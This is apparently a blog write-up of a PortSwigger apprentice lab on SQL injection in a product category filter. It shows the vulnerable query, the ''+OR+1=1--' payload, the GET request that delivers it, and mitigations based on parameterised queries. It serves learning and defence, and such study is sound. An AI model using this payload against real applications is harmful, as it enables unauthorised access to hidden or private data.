---
title: "PortSwigger: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
date: 2026-11-16 11:03:00 +0530
categories: [PortSwigger, SQL Injection]
tags: [apprentice, sql-injection, where-clause, firefox, burp-suite, web-security-academy, hidden-data]
image:
  path: /assets/img/posts/covers/sql-injection-where-clause-hidden-data.png
  alt: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
description: "Apprentice PortSwigger lab where a SQL injection in the product category filter is used to retrieve hidden, unreleased products by breaking out of the WHERE clause."
---

**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Apprentice
**Date:** 2026-11-16 11:03 IST

## 🎯 Objective

The lab has a SQL injection vulnerability in the product category filter. When a category is selected, the application runs a query like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

My goal is to perform a SQL injection attack that makes the application display one or more unreleased (hidden) products.

## 🔍 Recon & Analysis

When I select a category in the shop, the choice is passed through the `category` URL parameter:

```http
GET /filter?category=Corporate+gifts HTTP/1.1
Host: 0a4300d804070a7780b0c6ca00d00057.web-security-academy.net
```

This value drops straight into the `WHERE` clause of the backend query. The `released = 1` condition is what filters out unreleased products, so if I can neutralise that condition, the hidden products should appear.

![Normal Corporate gifts category listing before injection](/assets/img/posts/sql-injection-where-clause-hidden-data/01-corporate-gifts-filter.png)

## 💥 Exploitation

1. I take the `category` parameter and inject a payload that closes the string, adds an always-true condition, and comments out the rest of the query:

   ```text
   '+OR+1=1--
   ```

   The `+` characters are URL-encoded spaces, and `--` comments out the trailing `AND released = 1`.

2. I submit the modified request directly from the browser address bar:

   ```http
   GET /filter?category='+OR+1=1-- HTTP/1.1
   Host: 0a4300d804070a7780b0c6ca00d00057.web-security-academy.net
   ```

   ![Address bar showing the category parameter set to the OR 1=1 payload](/assets/img/posts/sql-injection-where-clause-hidden-data/02-category-payload-url.png)

   The resulting server-side query becomes:

   ```sql
   SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
   ```

   Because `OR 1=1` is always true and `AND released = 1` is commented out, the query returns every product — released or not.

3. The response now lists products beyond the normal catalogue, including unreleased items, and the lab is marked as solved.

   ![Congratulations banner confirming the lab is solved with hidden products displayed](/assets/img/posts/sql-injection-where-clause-hidden-data/03-lab-solved-banner.png)

> The same request can also be intercepted and modified in Burp Suite (Proxy/Repeater) instead of the browser address bar — the payload is identical.

## 🧠 Root Cause

The application builds its SQL query by concatenating the user-supplied `category` value directly into the `WHERE` clause without any sanitisation or parameterisation. This lets me break out of the intended string literal and inject my own logic (`OR 1=1`) and a comment (`--`), bypassing the `released = 1` restriction that was meant to hide unreleased products.

## 🛡️ Mitigation

- Use parameterised queries (prepared statements) so user input is treated strictly as data, never as SQL code.
- Apply allow-list validation for category values (e.g. match against known categories) instead of passing raw input into the query.
- Enforce authorization/visibility checks in the data layer so unreleased products are never returned, even if a query is manipulated.
- Run the database connection with least privilege.

## 📝 Key Takeaways

- User input placed inside a `WHERE` clause is a classic SQL injection sink.
- `' OR 1=1--` neutralises filtering conditions by making the clause always true and commenting out the rest.
- URL-encoded spaces (`+`) are enough to deliver the payload straight from the browser.
- "Hidden" data is only hidden by a query condition — remove the condition and it is exposed.
- Parameterised queries would have prevented this entirely.

## 🔧 Tools Used

- Firefox (URL/address-bar parameter manipulation)
- Burp Suite (alternative: intercept and modify the request) — optional
